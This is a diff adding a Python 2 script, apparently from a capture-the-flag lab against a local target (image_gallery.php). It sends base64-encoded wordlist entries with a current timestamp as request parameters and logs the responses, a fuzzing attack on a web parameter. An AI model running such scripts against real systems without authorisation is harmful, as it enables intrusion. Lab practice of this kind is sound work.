@@ -1,0 +1,60 @@
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+import datetime
+import time
+import requests
+import base64
+import argparse
+
+# 发送请求
+def sendRequest(fuzzWordlist, url):
+    wordlistFile = open(fuzzWordlist,'r')
+    for line in wordlistFile.readlines():
+        word = line.strip('\r').strip('\n')
+        # 逐行对字典中的内容进行fuzz，需要先对字典中每一行内容进行base64编码
+        payload = base64.b64encode(word.encode("utf-8"))
+        # 获取时间戳（因为我的kali与靶机的系统时间一致，使用kali系统的当前时间生成的时间戳就是靶机上的时间戳），我的kali系统时间比大北京时间慢12小时
+        dtime = datetime.datetime.now()
+        t = int(time.mktime(dtime.timetuple()))
+        # 命令行打印时间戳和base64编码的payload
+        print 'timestamp:' + str(t)
+        print 'base64:' + payload
+
+        try:
+            # 发送请求
+            URL = url
+            print URL
+            # 定义参数
+            PARAMS = {
+                't':t,
+                'f':payload}
+
+            r = requests.get(url = URL, params = PARAMS)
+            # print r.text
+            file = open("/root/response.txt", "a+")
+            # 为了方便区分请求的返回结果，加了这个
+            name = '--------' + word +' begin--------\r'
+            file.write(name)
+            file.write(r.content)
+            name = '--------' + word +' end--------\r\r'
+            file.write(name)
+            file.close()
+        except:
+            pass
+
+def main():
+    # 获取命令行输入的参数
+    parser = argparse.ArgumentParser(description='timestamp')
+    # 字典的物理路径 /usr/share/wordlist/fuzzlist/wordlist.txt
+    parser.add_argument("--w")
+    # 请求的url， http://192.168.0.107/image_gallery.php
+    parser.add_argument("--url")
+    args = parser.parse_args()
+    url = args.url
+    fuzzWordlist = args.w
+    # 调用方法
+    sendRequest(fuzzWordlist, url)
+
+if __name__ == '__main__':
+    main()
+
